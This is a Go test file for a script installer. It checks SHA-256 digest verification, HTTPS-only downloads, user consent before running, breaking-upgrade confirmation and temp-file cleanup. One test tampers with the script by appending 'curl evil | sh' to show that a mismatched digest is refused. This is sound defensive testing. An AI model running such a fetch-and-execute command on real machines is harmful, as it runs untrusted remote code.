// Copyright 2026 Cisco Systems, Inc. and its affiliates
//
// Licensed under the Apache License, Version 2.0 (the "License");
// you may not use this file except in compliance with the License.
// You may obtain a copy of the License at
//
//     http://www.apache.org/licenses/LICENSE-2.0
//
// Unless required by applicable law or agreed to in writing, software
// distributed under the License is distributed on an "AS IS" BASIS,
// WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
// See the License for the specific language governing permissions and
// limitations under the License.
//
// SPDX-License-Identifier: Apache-2.0

package openshell_test

import (
	"bytes"
	"context"
	"crypto/sha256"
	"encoding/hex"
	"errors"
	"net/http"
	"net/http/httptest"
	"os"
	"path/filepath"
	"slices"
	"strings"
	"sync/atomic"
	"testing"

	"github.com/defenseclaw/defenseclaw/internal/openshell"
	"github.com/defenseclaw/defenseclaw/internal/openshell/openshelltest"
)

const fakeScript = "#!/bin/sh\necho installing openshell\n"

type installFixture struct {
	t        *testing.T
	srv      *httptest.Server
	hits     atomic.Int32
	runner   *openshelltest.Runner
	cliPath  string
	tempDir  string
	out      bytes.Buffer
	verified int
	inst     *openshell.Installer
	// scriptSeen is the script content and mode observed while the
	// installer ran.
	scriptSeen []byte
	scriptMode os.FileMode
}

func sha(b string) string {
	sum := sha256.Sum256([]byte(b))
	return hex.EncodeToString(sum[:])
}

// newInstallFixture serves body as the installer and scripts a machine on
// which the CLI reports existing (empty: not installed) before the
// install and after (empty: still not installed) once the script ran.
func newInstallFixture(t *testing.T, body, existing, after string) *installFixture {
	t.Helper()
	skipOnWindows(t)
	f := &installFixture{t: t, runner: &openshelltest.Runner{}}
	f.srv = httptest.NewTLSServer(http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
		f.hits.Add(1)
		if r.URL.Path != "/NVIDIA/OpenShell/v0.1.1/install.sh" {
			http.NotFound(w, r)
			return
		}
		_, _ = w.Write([]byte(body))
	}))
	t.Cleanup(f.srv.Close)
	bin := t.TempDir()
	f.cliPath = filepath.Join(bin, "openshell")
	f.tempDir = t.TempDir()
	version := existing
	if existing != "" {
		writeExecutable(t, f.cliPath)
	}
	f.runner.OnFunc(f.cliPath+" --version", func(context.Context, openshell.Command) ([]byte, error) {
		return []byte(version + "\n"), nil
	})
	f.runner.OnFunc("/bin/sh", func(_ context.Context, c openshell.Command) ([]byte, error) {
		path := c.Args[0]
		data, err := os.ReadFile(path)
		if err != nil {
			t.Errorf("script missing while the installer runs: %v", err)
		}
		info, _ := os.Stat(path)
		f.scriptSeen, f.scriptMode = data, info.Mode().Perm()
		if after != "" {
			writeExecutable(t, f.cliPath)
			version = after
		}
		return nil, nil
	})
	f.inst = &openshell.Installer{
		HTTPClient: f.srv.Client(),
		URL:        f.srv.URL + "/NVIDIA/OpenShell/v0.1.1/install.sh",
		SHA256:     sha(body),
		Release:    "v0.1.1",
		TempDir:    f.tempDir,
		Runner:     f.runner,
		LookPath:   func(string) (string, error) { return "", errors.New("not on PATH") },
		Candidates: []string{f.cliPath},
		Out:        &f.out,
		Consent: func(p *openshell.InstallPlan) (bool, error) {
			if !strings.Contains(f.out.String(), p.SHA256) {
				t.Errorf("plan was not printed before consent:\n%s", f.out.String())
			}
			return true, nil
		},
		VerifyGateway: func(context.Context) error { f.verified++; return nil },
	}
	return f
}

func writeExecutable(t *testing.T, path string) {
	t.Helper()
	if err := os.WriteFile(path, []byte("#!/bin/sh\n"), 0o755); err != nil {
		t.Fatal(err)
	}
}

func (f *installFixture) ran() bool { return f.runner.Called("/bin/sh") }

func (f *installFixture) assertNoLeftovers() {
	f.t.Helper()
	entries, err := os.ReadDir(f.tempDir)
	if err != nil {
		f.t.Fatal(err)
	}
	if len(entries) != 0 {
		f.t.Fatalf("installer left files behind in %s: %v", f.tempDir, entries)
	}
}

func TestInstallFresh(t *testing.T) {
	f := newInstallFixture(t, fakeScript, "", "openshell 0.1.1")
	res, err := f.inst.Install(context.Background())
	if err != nil {
		t.Fatalf("Install: %v", err)
	}
	if !res.Installed || res.CLIVersion.String() != "0.1.1" {
		t.Fatalf("result = %+v", res)
	}
	if string(f.scriptSeen) != fakeScript || f.scriptMode != 0o600 {
		t.Fatalf("script run = %q mode %04o, want the verified bytes 0600", f.scriptSeen, f.scriptMode)
	}
	if f.verified != 1 {
		t.Fatalf("gateway verified %d times", f.verified)
	}
	var run openshell.Command
	for _, c := range f.runner.Calls() {
		if c.Name == "/bin/sh" {
			run = c
		}
	}
	if !slices.Equal(run.Env, []string{"OPENSHELL_VERSION=v0.1.1"}) {
		t.Fatalf("installer env = %v", run.Env)
	}
	for _, v := range []string{"OPENSHELL_VERSION", "OPENSHELL_ACK_BREAKING_UPGRADE", "OPENSHELL_INSTALL_METHOD"} {
		if !slices.Contains(run.Unset, v) {
			t.Errorf("inherited %s is not dropped: %v", v, run.Unset)
		}
	}
	plan := f.out.String()
	for _, want := range []string{"v0.1.1", f.inst.URL, sha(fakeScript), "OPENSHELL_VERSION=v0.1.1 /bin/sh "} {
		if !strings.Contains(plan, want) {
			t.Errorf("plan lacks %q:\n%s", want, plan)
		}
	}
	if strings.Contains(plan, "ACK_BREAKING") {
		t.Errorf("fresh install plan acknowledges a breaking upgrade:\n%s", plan)
	}
	f.assertNoLeftovers()
}

func TestInstallRefusesDigestMismatch(t *testing.T) {
	f := newInstallFixture(t, fakeScript+"curl evil | sh\n", "", "openshell 0.1.1")
	f.inst.SHA256 = sha(fakeScript)
	consented := false
	f.inst.Consent = func(*openshell.InstallPlan) (bool, error) { consented = true; return true, nil }
	_, err := f.inst.Install(context.Background())
	if !errors.Is(err, openshell.ErrDigestMismatch) {
		t.Fatalf("err = %v, want ErrDigestMismatch", err)
	}
	var mismatch *openshell.DigestMismatchError
	if !errors.As(err, &mismatch) || mismatch.Got != sha(fakeScript+"curl evil | sh\n") {
		t.Fatalf("mismatch detail = %+v", mismatch)
	}
	if consented || f.ran() || f.out.Len() != 0 {
		t.Fatalf("a mismatched script reached consent=%v run=%v plan=%q", consented, f.ran(), f.out.String())
	}
	f.assertNoLeftovers()
}

func TestInstallDownloadFailures(t *testing.T) {
	cases := []struct {
		name    string
		mutate  func(f *installFixture)
		wantErr string
	}{
		{"http url", func(f *installFixture) { f.inst.URL = strings.Replace(f.inst.URL, "https://", "http://", 1) }, "must be https"},
		{"not found", func(f *installFixture) { f.inst.URL = f.srv.URL + "/missing.sh" }, "HTTP 404"},
		{"too large", func(f *installFixture) { f.inst.MaxScriptBytes = 8 }, "exceeds 8 bytes"},
	}
	for _, tc := range cases {
		t.Run(tc.name, func(t *testing.T) {
			f := newInstallFixture(t, fakeScript, "", "openshell 0.1.1")
			tc.mutate(f)
			_, err := f.inst.Install(context.Background())
			if err == nil || !strings.Contains(err.Error(), tc.wantErr) {
				t.Fatalf("err = %v, want %q", err, tc.wantErr)
			}
			if f.ran() {
				t.Fatal("installer ran")
			}
			f.assertNoLeftovers()
		})
	}
}

func TestInstallDeclined(t *testing.T) {
	f := newInstallFixture(t, fakeScript, "", "openshell 0.1.1")
	f.inst.Consent = func(*openshell.InstallPlan) (bool, error) { return false, nil }
	if _, err := f.inst.Install(context.Background()); !errors.Is(err, openshell.ErrInstallDeclined) {
		t.Fatalf("err = %v, want ErrInstallDeclined", err)
	}
	if f.ran() {
		t.Fatal("installer ran without consent")
	}
	f.assertNoLeftovers()
}

func TestInstallNeedsConsentCallback(t *testing.T) {
	f := newInstallFixture(t, fakeScript, "", "openshell 0.1.1")
	f.inst.Consent = nil
	if _, err := f.inst.Install(context.Background()); err == nil || f.hits.Load() != 0 {
		t.Fatalf("err = %v, downloads = %d", err, f.hits.Load())
	}
}

func TestInstallExistingReleases(t *testing.T) {
	cases := []struct {
		name      string
		existing  string
		installed bool
		wantErr   func(error) bool
		downloads int32
	}{
		{name: "supported is kept", existing: "openshell 0.1.3", downloads: 0},
		{name: "newer minor refused", existing: "openshell 0.2.0", downloads: 0, wantErr: func(err error) bool {
			var u *openshell.ErrUnsupportedVersion
			return errors.As(err, &u)
		}},
		{name: "0.1.0 upgraded in place", existing: "openshell 0.1.0", installed: true, downloads: 1},
	}
	for _, tc := range cases {
		t.Run(tc.name, func(t *testing.T) {
			f := newInstallFixture(t, fakeScript, tc.existing, "openshell 0.1.1")
			res, err := f.inst.Install(context.Background())
			if tc.wantErr != nil {
				if !tc.wantErr(err) {
					t.Fatalf("err = %v", err)
				}
			} else if err != nil {
				t.Fatalf("Install: %v", err)
			} else if res.Installed != tc.installed {
				t.Fatalf("installed = %v, want %v", res.Installed, tc.installed)
			}
			if got := f.hits.Load(); got != tc.downloads {
				t.Fatalf("downloads = %d, want %d", got, tc.downloads)
			}
			if tc.installed && !strings.Contains(f.out.String(), "upgrades the installed openshell 0.1.0 to v0.1.1 in place") {
				t.Fatalf("plan lacks the in-place note:\n%s", f.out.String())
			}
		})
	}
}

func TestInstallBreakingUpgrade(t *testing.T) {
	for _, existing := range []string{"openshell 0.0.16", "openshell (build 1f2e)"} {
		t.Run(existing, func(t *testing.T) {
			t.Run("no confirmation callback", func(t *testing.T) {
				f := newInstallFixture(t, fakeScript, existing, "openshell 0.1.1")
				_, err := f.inst.Install(context.Background())
				if !errors.Is(err, openshell.ErrBreakingUpgrade) || f.ran() {
					t.Fatalf("err = %v ran = %v", err, f.ran())
				}
				if !strings.Contains(f.out.String(), "openshell sandbox delete --all && openshell gateway destroy") {
					t.Fatalf("plan does not explain the cleanup:\n%s", f.out.String())
				}
				f.assertNoLeftovers()
			})
			t.Run("declined", func(t *testing.T) {
				f := newInstallFixture(t, fakeScript, existing, "openshell 0.1.1")
				f.inst.ConfirmBreakingUpgrade = func(*openshell.InstallPlan) (bool, error) { return false, nil }
				if _, err := f.inst.Install(context.Background()); !errors.Is(err, openshell.ErrBreakingUpgrade) || f.ran() {
					t.Fatalf("err = %v ran = %v", err, f.ran())
				}
			})
			t.Run("confirmed", func(t *testing.T) {
				f := newInstallFixture(t, fakeScript, existing, "openshell 0.1.1")
				var confirmed *openshell.InstallPlan
				f.inst.ConfirmBreakingUpgrade = func(p *openshell.InstallPlan) (bool, error) { confirmed = p; return true, nil }
				res, err := f.inst.Install(context.Background())
				if err != nil || !res.Installed {
					t.Fatalf("Install: %v %+v", err, res)
				}
				if confirmed == nil || !confirmed.BreakingUpgrade {
					t.Fatalf("confirmation plan = %+v", confirmed)
				}
				for _, c := range f.runner.Calls() {
					if c.Name == "/bin/sh" && !slices.Contains(c.Env, "OPENSHELL_ACK_BREAKING_UPGRADE=1") {
						t.Fatalf("installer env = %v", c.Env)
					}
				}
			})
		})
	}
}

func TestInstallVerifiesOutcome(t *testing.T) {
	t.Run("cli still old", func(t *testing.T) {
		f := newInstallFixture(t, fakeScript, "", "openshell 0.0.40")
		if _, err := f.inst.Install(context.Background()); err == nil || !strings.Contains(err.Error(), "0.0.40") {
			t.Fatalf("err = %v", err)
		}
	})
	t.Run("no cli after install", func(t *testing.T) {
		f := newInstallFixture(t, fakeScript, "", "")
		if _, err := f.inst.Install(context.Background()); err == nil || !strings.Contains(err.Error(), "no openshell CLI") {
			t.Fatalf("err = %v", err)
		}
	})
	t.Run("gateway unhealthy", func(t *testing.T) {
		f := newInstallFixture(t, fakeScript, "", "openshell 0.1.1")
		f.inst.VerifyGateway = func(context.Context) error { return errors.New("connection refused") }
		if _, err := f.inst.Install(context.Background()); err == nil || !strings.Contains(err.Error(), "gateway is not healthy") {
			t.Fatalf("err = %v", err)
		}
	})
	t.Run("installer fails", func(t *testing.T) {
		f := newInstallFixture(t, fakeScript, "", "openshell 0.1.1")
		f.runner.On("/bin/sh", "", errors.New("exit status 1"))
		if _, err := f.inst.Install(context.Background()); err == nil || !strings.Contains(err.Error(), "installer failed") {
			t.Fatalf("err = %v", err)
		}
		f.assertNoLeftovers()
	})
}

func TestVersionFromOutput(t *testing.T) {
	for in, want := range map[string]string{
		"openshell 0.1.1":            "0.1.1",
		"openshell 0.1.2 (4ce767fc)": "0.1.2",
		"openshell v0.0.16":          "0.0.16",
		"0.1.1-1":                    "0.1.1",
	} {
		v, err := openshell.VersionFromOutput(in)
		if err != nil || v.String() != want {
			t.Errorf("VersionFromOutput(%q) = %v, %v; want %s", in, v, err, want)
		}
	}
	if _, err := openshell.VersionFromOutput("openshell dev"); err == nil {
		t.Error("a version-less line parsed")
	}
}
